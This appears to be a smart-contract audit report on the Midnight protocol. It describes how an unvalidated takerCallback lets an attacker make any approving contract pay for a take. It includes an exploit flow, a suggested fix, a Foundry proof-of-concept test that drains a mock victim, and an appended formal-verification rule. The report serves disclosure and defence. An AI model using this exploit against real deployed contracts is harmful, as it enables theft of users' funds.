### Title
Unprivileged Taker Can Drain Victim Contract's Loan Tokens via Unvalidated `takerCallback` Payer Assignment - (File: src/Midnight.sol)

### Summary

In `Midnight.take`, when processing a sell offer (`offer.buy = false`), the `takerCallback` parameter is fully attacker-controlled and is used directly as both the `buyerCallback` and the `payer` without any check that it is the taker, `msg.sender`, or authorized by the taker. An attacker can pass any victim contract as `takerCallback`; if that contract has approved Midnight for the loan token and returns `CALLBACK_SUCCESS` from `onBuy`, the protocol will pull `buyerAssets` from the victim, crediting the attacker's position at zero cost to the attacker.

### Finding Description

**Exact code path — `src/Midnight.sol` lines 420–456:**

```solidity
address buyerCallback = offer.buy ? offer.callback : takerCallback;   // L420
address sellerCallback = offer.buy ? takerCallback : offer.callback;  // L421
address payer = buyerCallback != address(0)
    ? buyerCallback
    : (offer.buy ? buyer : msg.sender);                               // L422
```

For `offer.buy = false` (sell offer):
- `buyer = taker` (L375)
- `buyerCallback = takerCallback` — fully attacker-supplied
- `payer = takerCallback` whenever `takerCallback != address(0)`

Then:

```solidity
if (buyerCallback != address(0)) {
    require(
        IBuyCallback(buyerCallback).onBuy(...) == CALLBACK_SUCCESS,   // L447-452
        WrongBuyCallbackReturnValue()
    );
}
SafeTransferLib.safeTransferFrom(offer.market.loanToken, payer, address(this), buyerAssets - sellerAssets); // L455
SafeTransferLib.safeTransferFrom(offer.market.loanToken, payer, receiver, sellerAssets);                   // L456
```

**Attacker-controlled inputs:**
- `takerCallback` — no validation that it equals `taker`, `msg.sender`, or is authorized by either
- `units`, `offer` (any valid existing sell offer), `takerCallbackData`

**Only authorization check present:**

```solidity
require(taker == msg.sender || isAuthorized[taker][msg.sender], TakerUnauthorized()); // L346
```

This only validates the caller's right to act as `taker`. It says nothing about `takerCallback`.

**Exploit flow:**

1. Victim contract `V` has `loanToken.approve(midnight, type(uint256).max)` and implements `IBuyCallback`, returning `CALLBACK_SUCCESS` from `onBuy` for any call from Midnight (e.g., it is a legitimate Midnight integrator).
2. Attacker calls:
   ```
   midnight.take(sellOffer, ratifierData, units, attacker, receiver, address(V), callbackData)
   ```
3. `buyerCallback = address(V)`, `payer = address(V)`.
4. Midnight calls `V.onBuy(...)` → `V` returns `CALLBACK_SUCCESS` (it trusts Midnight as caller).
5. Midnight executes `safeTransferFrom(loanToken, V, address(this), buyerAssets - sellerAssets)` and `safeTransferFrom(loanToken, V, receiver, sellerAssets)`.
6. `V` loses `buyerAssets` in loan tokens. Attacker's position receives credit for `units` at zero personal cost.

**Why existing checks fail:**

The Certora spec `OnlyExplicitPayerCanLoseTokens.spec` (L91–115) explicitly classifies "the buyerCallback that returned `CALLBACK_SUCCESS`" as an allowed payer and sets `buyCallbackAllowed = true` unconditionally. The spec proves tokens are only pulled from the designated payer, but never verifies that the designated payer consented to being the payer for this specific take. The spec's `onCallBackSummary` (L57–67) models the callback non-deterministically returning `CALLBACK_SUCCESS`, which is exactly the victim scenario. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) 

### Impact Explanation

Direct loss of loan tokens from any contract that (a) has approved Midnight and (b) implements `IBuyCallback` returning `CALLBACK_SUCCESS`. The attacker acquires protocol credit (or debt reduction) for free. The victim's token balance decreases by `buyerAssets = units.mulDivUp(buyerPrice, WAD)`, which is unbounded up to the victim's balance and approval. This is a direct theft of user funds with no recovery path.

### Likelihood Explanation

**Preconditions:**
1. A victim contract has `loanToken.approve(midnight, ≥ buyerAssets)` — common for any protocol that interacts with Midnight (e.g., routers, aggregators, vaults).
2. The victim implements `IBuyCallback.onBuy` and returns `CALLBACK_SUCCESS` without verifying it was legitimately designated as the callback for this specific take — the natural implementation pattern for any Midnight buy-callback integrator.
3. A valid sell offer exists (any maker's sell offer with sufficient `maxUnits`/`maxAssets` remaining).

All three preconditions are realistic in a live ecosystem. The attack is repeatable (limited only by victim's balance/approval and offer capacity), requires no special privilege, and costs the attacker only gas.

### Recommendation

Require that `takerCallback` is either zero, equal to `taker`, or explicitly authorized by `taker` via `isAuthorized`. Concretely, add before the payer assignment:

```solidity
require(
    takerCallback == address(0) ||
    takerCallback == taker ||
    isAuthorized[taker][takerCallback],
    TakerCallbackUnauthorized()
);
```

This mirrors the existing `TakerUnauthorized` pattern and ensures the payer is always a party that the taker has explicitly consented to act on their behalf. [3](#0-2) [1](#0-0) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Midnight, Offer, Market} from "src/Midnight.sol";
import {IBuyCallback, CALLBACK_SUCCESS} from "src/interfaces/IBuyCallback.sol";
import {ERC20Mock} from "test/mocks/ERC20Mock.sol";

/// @dev Victim: approves Midnight, returns CALLBACK_SUCCESS from onBuy unconditionally.
contract VictimCallback is IBuyCallback {
    function onBuy(bytes32, Market memory, uint256, uint256, uint256, address, bytes memory)
        external pure returns (bytes32)
    {
        return CALLBACK_SUCCESS;
    }
}

contract TakerCallbackPayerConfusionTest is Test {
    Midnight midnight;
    ERC20Mock loanToken;
    VictimCallback victim;
    address attacker = address(0xA77AC4);
    address maker;  // sell-offer maker (lender)

    function setUp() public {
        // deploy protocol, create market, fund maker, create sell offer
        // ...
        victim = new VictimCallback();
        // victim gets tokens and approves Midnight
        deal(address(loanToken), address(victim), 1_000e18);
        vm.prank(address(victim));
        loanToken.approve(address(midnight), type(uint256).max);
    }

    function testFuzz_victimDrained(uint256 units) public {
        units = bound(units, 1, maxUnits);

        uint256 victimBalBefore = loanToken.balanceOf(address(victim));
        uint256 attackerCreditBefore = midnight.creditOf(marketId, attacker);

        // Attacker takes sell offer, designating victim as takerCallback/payer
        vm.prank(attacker);
        midnight.take(sellOffer, hex"", units, attacker, attacker, address(victim), hex"");

        uint256 victimBalAfter = loanToken.balanceOf(address(victim));
        uint256 attackerCreditAfter = midnight.creditOf(marketId, attacker);

        // Victim lost tokens
        assertLt(victimBalAfter, victimBalBefore, "victim balance must decrease");
        // Attacker gained credit without paying
        assertGt(attackerCreditAfter, attackerCreditBefore, "attacker credit must increase");
        // Attacker paid nothing
        assertEq(loanToken.balanceOf(attacker), 0, "attacker paid nothing");
    }
}
```

**Expected assertions:** `victim.balanceOf` decreases by `buyerAssets`; attacker's credit increases by up to `units`; attacker's own token balance remains zero.

/// Proves that in `take`, the only addresses whose tokens can be pulled are:
/// 1. msg.sender (when !offer.buy and buyerCallback == 0),
/// 2. the buyerCallback that returned CALLBACK_SUCCESS,
/// 3. the offer maker (when offer.buy and buyerCallback == 0, i.e. maker is the buyer with no callback).
rule takeOnlyExplicitPayer(env e, Midnight.Offer offer, bytes ratifierData, uint256 units, address taker, address receiverIfTakerIsSeller, address takerCallback, bytes takerCallbackData) {
    require e.msg.sender != currentContract, "only external calls";

    address buyerCallback = offer.buy ? offer.callback : takerCallback;

    msgSender = e.msg.sender;
    msgSenderAllowed = !offer.buy && buyerCallback == 0;
    callbackAllowed = false;
    maker = offer.maker;
    makerAllowed = offer.buy && buyerCallback == 0;

    buyCallbackAllowed = true;
    liquidateCallbackAllowed = false;
    repayCallbackAllowed = false;
    flashLoanCallbackAllowed = false;
    badPullSeen = false;

    take(e, offer, ratifierData, units, taker, receiverIfTakerIsSeller, takerCallback, takerCallbackData);

    assert !badPullSeen;
}
